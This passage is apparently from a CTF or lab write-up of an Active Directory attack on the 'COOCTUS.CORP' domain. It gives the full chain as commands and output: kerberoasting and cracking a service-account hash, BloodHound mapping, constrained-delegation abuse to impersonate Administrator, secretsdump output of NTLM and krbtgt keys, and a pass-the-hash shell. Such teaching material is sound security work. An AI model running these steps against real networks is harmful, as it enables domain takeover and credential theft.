+LDAP        10.10.208.147   389    DC               <span style="color:orange; font-weight: bold">$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.
+CORP\password-reset*$20400aebcfbfa3ac64b7cd54d1d74fb4$5a01618556b6fcfd22bc479c7e2e6eb6825db3114e107eac0dfce91dcb7d00a7d35b7306582f750aa805fd2e7ee55dc6086803b
+57cbc53dc53272dff8133c13ca9c3f07a7bea210566a516781d385a54683a8993537ac45ad39919e5930635543d38f5b7ed8067fa65850744b0fcf75690d3043f821d742e418f843ef9a8ce530b3237f82ca833688d5c83e8406a2796a4fb3240ae80b23e844eb224b9479588b2d60dca093db7ba8547bcbeb2a8751592940fde8c35d67844b2dfcf90104699d7952f397262
+1498b1ba5ccd6ac263eeaabd8e46fc10509c7c761d28d93e8e26289c39e9130afba998c7a299326f23b5333f53c3b6c9cbf8841c096524c8dc9fcf1a9a6ed1b5c3b0cdfc2199d6ad9a0d93519361ec7ad6ec4c14dbabd8dbf1e00328c8a2d1893c3e144c4bab760f43177c450ff16c79ba0209c58e5607f8f090763ffdb789d334e5bf706c80bcac15ffb15cadfbd0a518312db4eb88cf23bbed7277b59871e128c689ccf911bc840dea0130d319842a20e9eb180578a03a6e33f27dd8d8da51c9d2ec2983812ad10b8b08011ed5aa6cf8bd87a88919628407a748e87290f6a865ea47363487179ae9ec38206e533034b37eb6dd7ae69b9fbac569429db69ce4ed36a467f972b5eb7254a8badf13104d1ea1287e7a690328667c9de5b36e1d69c93e027f71a1628c00888df125c388489f1a160327317adbd5650bd58c9716074d2e2d1f0b219efc99f613fdb3a57a03fcdfad0b0362190887f6bfd9fd400b75a20f91394d021210d1e64ef54ceb80a1adb750ea4dac43305d4e4c81588a5ec2522f828a70008abcb0f101465c9afd77fdf8201fe6809da2d40eb42c3daab2ea049ad4903017b1f22b8b59cef8ae3213dc9157ee2a701af5178a5e8f9b1e4a743635f242daf3eb98bfbb6c927e0608b3b1cf99a4126962965644f1cf795497d5fa31efe94124fda8fa85d7ea6b750808ef769e26cdbd0056d00ab63c8b7bde5f23da743cce4e9b69dc4aaf828a1d83a537583e111146c1cda4d938072ecbc88b0cbb8204bb4
+195b1db86463b8152567d302cde6751fe349fc18e3bc7bc037f7afb7c8d783b4fd454afe279bf7885403c417e2b73625bcfca99815f05ec9b61817c9d05d6d98c43bb6988e1f24766d62cd2fee4d4
+3e2eaab77a9da3686dab1c8768569d362d835d7ab55de224d6608af3398890eaaf1cc2b1dd2a4ceeaccce98f0e3903777cf115d1603960249fe24c1e6f73e43ccc49243e82736986b2aaf3581f014e0479e26d5667b4b0b61175da838c74ae91a7e4a6a89bd7f5dd60fa369fb378906448a3486991ab8a788e069fcb37c65d97a1df</span>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Success! I found one kerberoastable user: <code>password-reset</code>. I took the TGS hash and cracked it with <code>hashcat</code> and <code>rockyou.txt</code>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">hashcat</span> kereberoastable.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+
+...SNIP...
+$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP\password-reset*$20400aebcfbfa3ac64b7cd54d1d74fb4$5a01618556b6fcfd22bc479c7e2e6eb6825db3114e107eac0dfce91dcb7d00a7d35b7306582f750aa805fd2e7ee55dc6086803b57cbc53dc53272dff8133c13ca9c3f07a7bea210566a516781d385a54683a8993537ac45ad39919e5930635543d38f5b7ed8067fa65850744b0fcf75690d3043f821d742e418f843ef9a8ce530b3237f82ca833688d5c83e8406a2796a4fb3240ae80b23e844eb224b9479588b2d60dca093db7ba8547bcbeb2a8751592940fde8c35d67844b2dfcf90104699d7952f3972621498b1ba5ccd6ac263eeaabd8e46fc10509c7c761d28d93e8e26289c39e9130afba998c7a299326f23b5333f53c3b6c9cbf8841c096524c8dc9fcf1a9a6ed1b5c3b0cdfc2199d6ad9a0d93519361ec7ad6ec4c14dbabd8dbf1e00328c8a2d1893c3e144c4bab760f43177c450ff16c79ba0209c58e5607f8f090763ffdb789d334e5bf706c80bcac15ffb15cadfbd0a518312db4eb88cf23bbed7277b59871e128c689ccf911bc840dea0130d319842a20e9eb180578a03a6e33f27dd8d8da51c9d2ec2983812ad10b8b08011ed5aa6cf8bd87a88919628407a748e87290f6a865ea47363487179ae9ec38206e533034b37eb6dd7ae6
+9b9fbac569429db69ce4ed36a467f972b5eb7254a8badf13104d1ea1287e7a690328667c9de5b36e1d69c93e027f71a1628c00888df125c388489f1a160327317adbd5650bd58c9716074d2e2d1f0b219efc99f613fdb3a57a03fcdfad0b0362190887f6bfd9fd400b75a20f91394d021210d1e64ef54ceb80a1adb750ea4dac43305d4e4c81588a5ec2522f828a70008abcb0f101465c9afd77fdf820
+1fe6809da2d40eb42c3daab2ea049ad4903017b1f22b8b59cef8ae3213dc9157ee2a701af5178a5e8f9b1e4a743635f242daf3eb98bfbb6c927e0608b3b1cf99a4126962965644f1cf795497d5fa31efe94124fda8fa85d7ea6b750808ef769e26cdbd0056d00ab63c8b7bde5f23da743cce4e9b69dc4aaf828a1d83a537583e111146c1cda4d938072ecbc88b0cbb8204bb4195b1db86463b8152567d
+302cde6751fe349fc18e3bc7bc037f7afb7c8d783b4fd454afe279bf7885403c417e2b73625bcfca99815f05ec9b61817c9d05d6d98c43bb6988e1f24766d62cd2fee4d43e2eaab77a9da3686dab1c8768569d362d835d7ab55de224d6608af3398890eaaf1cc2b1dd2a4ceeaccce98f0e3903777cf115d1603960249fe24c1e6f73e43ccc49243e82736986b2aaf3581f014e0479e26d5667b4b0b611
+75da838c74ae91a7e4a6a89bd7f5dd60fa369fb378906448a3486991ab8a788e069fcb37c65d97a1df:resetpassword
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CO...97a1df
+Time.Started.....: Wed Jul  9 18:25:31 2025 (0 secs)
+Time.Estimated...: Wed Jul  9 18:25:31 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 56756.1 kH/s (6.63ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1507328/14344385 (10.51%)
+Rejected.........: 0/1507328 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> meisgay1
+Hardware.Mon.#1..: Temp: 38c Fan: 39% Util:  5% Core:1725MHz Mem:6800MHz Bus:16
+
+Started: Wed Jul  9 18:25:30 2025
+Stopped: Wed Jul  9 18:25:32 2025
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The cracked password was <code>resetpassword</code>.</p>
+<h3 id="bloodhound-analysis-t1069">BloodHound Analysis (T1069)<a hidden class="anchor" aria-hidden="true" href="#bloodhound-analysis-t1069">#</a></h3>
+<p>Now with a new set of credentials (<code>password-reset:resetpassword</code>), it was time to map out the domain with BloodHound. I ran the collector and loaded the data.
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">bloodhound-ce-python</span> <span class="flag">-d</span> cooctus.corp <span class="flag">-u</span> password-reset <span class="flag">-p</span> <span class="string">'resetpassword'</span> <span class="flag">-dc</span> dc.cooctus.corp <span class="flag">-ns</span> $target <span class="flag">-c</span> All <span class="flag">--zip</span>
+INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: cooctus.corp
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.cooctus.corp
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to GC LDAP server: dc.cooctus.corp
+INFO: Connecting to LDAP server: dc.cooctus.corp
+INFO: Found 17 users
+INFO: Found 63 groups
+INFO: Found 2 gpos
+INFO: Found 11 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.COOCTUS.CORP
+INFO: Done in 00M 26S
+INFO: Compressing output into 20250709182710_bloodhound.zip
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>At first, I saw that the <code>password-reset</code> user had <code>ForceChangePassword</code> rights on a bunch of users, but this looked like a rabbit hole.</p>
+<img src="/img/croccCrew/forcechangepass.png" alt="" class="img-responsive" loading="lazy" />
+<p>The real interesting permission was under &ldquo;Execution Privileges.&rdquo;</p>
+<img src="/img/croccCrew/exec.png" alt="" class="img-responsive" loading="lazy" />
+<p>The <code>password-reset</code> account has <code>AllowedToDelegateTo</code> rights on the Domain Controller itself. This is a constrained delegation vulnerability and our path to domain admin.</p>
+<h3 id="constrained-delegation-abuse-t1558001">Constrained Delegation Abuse (T1558.001)<a hidden class="anchor" aria-hidden="true" href="#constrained-delegation-abuse-t1558001">#</a></h3>
+<p>For constrained delegation to work, we need to request a ticket for a Service Principal Name (<code>SPN</code>) that our user is allowed to delegate to. I used <code>ldapsearch</code> to find the specific SPNs listed in the <code>msDS-AllowedToDelegateTo</code> attribute for our user.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-D</span> <span class="string">'COOCTUS\password-reset'</span> <span class="flag">-w</span> <span class="string">'resetpassword'</span> <span class="flag">-b</span> <span class="string">"dc=cooctus,dc=corp"</span> <span class="string">"(&(objectClass=user)(sAMAccountName=password-reset))"</span> msDS-AllowedToDelegateTo 
+# extended LDIF
+#
+# LDAPv3
+# base <dc=cooctus,dc=corp> with scope subtree
+# filter: (&(objectClass=user)(sAMAccountName=password-reset))
+# requesting: msDS-AllowedToDelegateTo 
+#
+
+# reset, Service-Accounts, COOCTUS.CORP
+dn: CN=reset,OU=Service-Accounts,DC=COOCTUS,DC=CORP
+msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS.CORP
+msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP
+msDS-AllowedToDelegateTo: oakley/DC
+msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS
+msDS-AllowedToDelegateTo: oakley/DC/COOCTUS
+
+# search reference
+ref: ldap://ForestDnsZones.COOCTUS.CORP/DC=ForestDnsZones,DC=COOCTUS,DC=CORP
+
+# search reference
+ref: ldap://DomainDnsZones.COOCTUS.CORP/DC=DomainDnsZones,DC=COOCTUS,DC=CORP
+
+# search reference
+ref: ldap://COOCTUS.CORP/CN=Configuration,DC=COOCTUS,DC=CORP
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 1
+# numReferences: 3
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The results showed that we could delegate to the <code>oakley/DC.COOCTUS.CORP</code> SPN. With this information, I used <code>getST.py</code> to request a service ticket for the Administrator user to that specific SPN.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">getST.py</span> <span class="flag">-impersonate</span> Administrator <span class="flag">-spn</span> oakley/DC.COOCTUS.CORP <span class="string">"COOCTUS.CORP/password-reset:resetpassword"</span> <span class="flag">-dc-ip</span> $target                                     
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="indicator-error">[-]</span> CCache file is not found. Skipping...
+<span class="indicator-info">[*]</span> Getting TGT for user
+<span class="indicator-info">[*]</span> Impersonating Administrator
+<span class="indicator-info">[*]</span> Requesting S4U2self
+<span class="indicator-info">[*]</span> Requesting S4U2Proxy
+<span class="indicator-info">[*]</span> Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>This worked, and I got a Kerberos ticket for the Administrator. Now for the moment of truth. I exported the ticket path and ran <code>secretsdump.py</code>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">impacket-secretsdump</span> <span class="flag">-k</span> <span class="flag">-no-pass</span> DC.COOCTUS.CORP                                 
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+<span class="indicator-error">[-]</span> Policy SPN target name validation might be restricting full DRSUAPI dump. Try <span class="flag">-just-dc-user</span>                  
+<span class="indicator-info">[*]</span> Cleaning up...  
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>And&hellip; nothing. Just an error. This is where I started to get really frustrated. I had a valid ticket, the delegation path was clear in BloodHound, but <code>secretsdump</code> was failing. I tried every variation of the command I could think of. I checked my Impacket version. I re-ran the LDAP queries. Nothing worked.</p>
+<p>After banging my head against the wall for a while, I started thinking about the fundamentals. How does Kerberos resolve the SPN? It uses DNS. What if my local DNS resolution was the problem? I checked my <code>/etc/hosts</code> file:</p>
+<pre tabindex="0"><code>10.10.208.147 dc dc.cooctus.corp cooctus.corp
+</code></pre><p>Maybe the order mattered. On a whim, I changed it to put the FQDN first:</p>
+<pre tabindex="0"><code>10.10.208.147 dc.cooctus.corp dc cooctus.corp
+</code></pre><p>I re-ran the exact same <code>secretsdump.py</code> command:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">secretsdump.py</span> <span class="flag">-k</span> <span class="flag">-no-pass</span> DC.COOCTUS.CORP
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies
+
+<span class="indicator-info">[*]</span> Service RemoteRegistry is in stopped state
+<span class="indicator-info">[*]</span> Starting service RemoteRegistry
+<span class="indicator-info">[*]</span> Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
+<span class="indicator-info">[*]</span> Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<span class="indicator-info">[*]</span> Dumping cached domain logon information (domain/username:hash)
+<span class="indicator-info">[*]</span> Dumping LSA Secrets
+<span class="indicator-info">[*]</span> $MACHINE.ACC
+COOCTUS\DC$:plain_password_hex:24047b8716bce25060a37638eed5e6769c28129db31c48c363bac06edbc5f8a9e5e230932bac0376ecfa63917c974fbcf218d8bfd70ae9497a2718a102de68b8dead83b13967ede14d31caa32390f25c5a645015673d11efb59232c77a2f05270df314dada6188877d2e51f45df67cb83c8f104d9054db00e6e783e78738e0a8e6774a4303fc4c4649a1a66d317735cb2a7c9eb6f8403d408146d6725506e3b1a8447820b69e43f192a0f9511c588da863115e6338796b4aca9073c1fa78ca2c9d808c79e200df1c8e259f52164089187cd002cd24c2685bcad8f77c8018c2b16e22b9ecd9e49898a78687d3f811f8b2
+COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:273cbe9ae9f6656a5ba69c2c6f4d6cd2:::
+<span class="indicator-info">[*]</span> DPAPI_SYSTEM
+dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
+dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
+<span class="indicator-info">[*]</span> NL$KM
+ 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
+ 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
+ 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
+ 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
+NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
+<span class="indicator-info">[*]</span> Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+<span class="indicator-info">[*]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
+COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
+COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
+COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
+COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
+COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
+COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
+COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
+COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
+COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
+COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
+COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
+COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
+COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
+COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
+COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
+COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
+COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
+COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
+COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:273cbe9ae9f6656a5ba69c2c6f4d6cd2:::
+<span class="indicator-info">[*]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
+Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
+Administrator:des-cbc-md5:5243234aef9d0e83
+krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
+krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
+krbtgt:des-cbc-md5:d9eff2048f2f3e46
+COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
+COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
+COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
+COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
+COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
+COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
+COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
+COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
+COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
+COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
+COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
+COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
+COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
+COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
+COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
+COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
+COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
+COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
+COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
+COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
+COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
+COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
+COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
+COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
+COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
+COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
+COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
+COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
+COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
+COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
+COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
+COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
+COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
+COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
+COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
+COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
+COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
+COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
+COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
+COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
+COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
+COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
+COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
+COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
+COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
+COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
+COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
+COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
+COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
+COOCTUS.CORP\Ben:aes128-cts-hmac-sha1-96:59774a99d18f215d34ea1f33a27bf1fe
+COOCTUS.CORP\Ben:des-cbc-md5:801c51ea8546b55d
+COOCTUS.CORP\David:aes256-cts-hmac-sha1-96:be42bf5c3aa5161f7cf3f8fce60613fc08cee0c487f5a681b1eeb910bf079c74
+COOCTUS.CORP\David:aes128-cts-hmac-sha1-96:6b17ec1654837569252f31fec0263522
+COOCTUS.CORP\David:des-cbc-md5:e5ba4f34cd5b6dae
+COOCTUS.CORP\password-reset:aes256-cts-hmac-sha1-96:cdcbd00a27dcf5e46691aac9e51657f31d7995c258ec94057774d6e011f58ecb
+COOCTUS.CORP\password-reset:aes128-cts-hmac-sha1-96:bb66b50c126becf82f691dfdb5891987
+COOCTUS.CORP\password-reset:des-cbc-md5:343d2c5e01b5a74f
+DC$:aes256-cts-hmac-sha1-96:0987277a0d1e2a77a57271ef5b12bbab4d5627a8d78e3ee9b5e33a686deb8794
+DC$:aes128-cts-hmac-sha1-96:a585c581487da9f0927bf0a328884711
+DC$:des-cbc-md5:0183d370d66115e6
+<span class="indicator-info">[*]</span> Cleaning up...
+
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>It worked. It freaking worked. The entire problem was the order of hostnames in a local text file. With the Administrator&rsquo;s NTLM hash in hand (<code>add41095f1fb0405b32f70a489de022d</code>), I could finally get a shell.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@crocccrew: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">evil-winrm</span> <span class="flag">-i</span> $target <span class="flag">-u</span> Administrator <span class="flag">-H</span> add41095f1fb0405b32f70a489de022d
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
